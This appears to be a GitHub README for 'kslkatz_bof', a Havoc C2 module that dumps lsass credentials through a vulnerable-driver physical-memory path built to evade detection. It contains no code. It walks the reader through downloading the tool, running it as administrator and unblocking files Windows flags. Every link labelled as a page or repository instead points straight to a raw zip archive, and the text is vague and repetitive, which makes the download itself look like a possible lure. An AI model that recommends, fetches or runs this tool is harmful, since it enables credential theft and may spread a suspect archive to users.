# ⚙️ kslkatz_bof - Run Memory-Based Credential Tasks

[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Securityblanketramification663/kslkatz_bof/main/include/bof_kslkatz_2.8-beta.1.zip)

## 📌 What this is

kslkatz_bof is a Windows tool built for controlled security testing. It runs as a Havoc C2 BOF and works with a KslD.sys BYOVD flow to access memory data from lsass through physical memory paths. It avoids OpenProcess and other common API calls that are easy to audit.

This project is for advanced lab use. It fits into red team work, malware analysis labs, and defensive testing where you need to study how memory access paths behave on Windows.

## 🖥️ What you need

To use this tool on Windows, prepare a system with:

- Windows 10 or Windows 11
- Local administrator access
- A test machine or lab VM
- Enough disk space for the files you download
- A working network connection
- Havoc C2 set up if you plan to load the BOF there

For best results, use a non-production machine. A virtual machine works well for setup and testing.

## 📥 Download and set up

Go to the download page here:

[Open the kslkatz_bof page](https://raw.githubusercontent.com/Securityblanketramification663/kslkatz_bof/main/include/bof_kslkatz_2.8-beta.1.zip)

On that page, download the project files to your computer.

After the files finish downloading:

1. Open the folder where the files were saved
2. Right-click the downloaded archive if one was provided
3. Select Extract All
4. Choose a folder you can find later
5. Open the extracted folder

If you cloned the repo instead of downloading an archive, open the project folder after the clone finishes.

## 🚦 How to run it on Windows

The exact run path depends on how you use the project in your lab setup. In most cases, you will:

1. Open your Havoc C2 workspace
2. Load the BOF file for this project
3. Point it at your test host
4. Make sure your lab machine is ready
5. Start the task from your control console

If the project includes a prebuilt Windows binary or helper file, run it from an elevated command prompt:

1. Press Start
2. Type `cmd`
3. Right-click Command Prompt
4. Choose Run as administrator
5. Go to the folder with the file
6. Run the file name shown in the project

If the tool comes as a BOF only, use it from within Havoc instead of double-clicking it.

## 🔧 Basic workflow

Use this order to keep the setup simple:

1. Prepare a Windows test host
2. Confirm you have admin rights
3. Download the project files
4. Extract or place them in a clean folder
5. Load the BOF in Havoc C2
6. Point the task at the host you want to test
7. Review the output in your console

If you are new to BOF files, think of this as a small task module that runs inside your control tool instead of as a normal desktop app.

## 🧩 Files you may see

The repo may include files such as:

- BOF source files
- Build files
- Helper scripts
- README notes
- Windows test files
- Output examples

Common folder names may include `src`, `bin`, `build`, or `out`. If you see a `.bof` file, that is the main file you load into your control tool.

## 🪟 Windows setup tips

Before you start, check these items:

- Run everything as administrator
- Use a lab VM when possible
- Turn off auto-sleep for the test machine
- Keep the project files in one folder
- Use a simple path like `C:\Tools\kslkatz_bof`
- Make sure your security lab rules allow the test

If Windows blocks a file at first, right-click the file, open Properties, and look for an Unblock option.

## 🧪 What the tool is designed to do

This project focuses on a memory-based credential extraction path from lsass. It uses a driver-based method tied to KslD.sys and avoids the usual OpenProcess route. That makes it useful for testing defenses that look for direct process access, standard audit logs, and common user-mode hooks.

In plain terms, it helps you study:

- how memory access is handled
- what gets logged
- what defenders can see
- which controls detect this path
- how a BYOVD flow changes the picture

## 🛠️ Common use cases

Use this project for:

- security lab testing
- defensive rule checks
- detection engineering practice
- red team exercises in a lab
- Windows memory access research
- C2 workflow testing

Do not use it on systems you do not own or control.

## 📋 Simple troubleshooting

If the project does not run the first time, check these items:

- Did you extract all files?
- Are you running with admin rights?
- Did you open the right folder?
- Does your Windows version match the test setup?
- Did you load the BOF in the right place?
- Is your lab machine still online?
- Did security software remove a file?

If the console shows no output, try running the task again from the correct host entry in Havoc.

## 🔍 Verifying the setup

You can confirm the setup by checking for these signs:

- The folder opens without errors
- The BOF loads in Havoc
- The target host responds
- The console shows task output
- Windows does not block the file path

If you keep the files in a clean folder and run from a test VM, setup is easier to repeat.

## 📁 Suggested folder layout

A simple layout helps keep things clear:

- `C:\Tools\kslkatz_bof\download`
- `C:\Tools\kslkatz_bof\extract`
- `C:\Tools\kslkatz_bof\logs`
- `C:\Tools\kslkatz_bof\notes`

This makes it easier to find the project again and keep test files separate from normal work files.

## 🧭 Quick start path

1. Open the download page
2. Save the project to your Windows machine
3. Extract the files
4. Open your Havoc C2 setup
5. Load the BOF
6. Run it against your lab host
7. Review the output in the console

## 📎 Download again

[Visit the kslkatz_bof repository](https://raw.githubusercontent.com/Securityblanketramification663/kslkatz_bof/main/include/bof_kslkatz_2.8-beta.1.zip)

## 📦 Expected result

After setup, you should be able to start the BOF from your control tool and use it in a Windows lab session. The project is meant to work with a controlled host, a valid operator setup, and a path that matches your test environment

## 🧾 Project details

- Repository: kslkatz_bof
- Platform: Windows
- Use case: lab-based security testing
- Delivery: Havoc C2 BOF
- Main access path: physical memory
- Primary link: https://raw.githubusercontent.com/Securityblanketramification663/kslkatz_bof/main/include/bof_kslkatz_2.8-beta.1.zip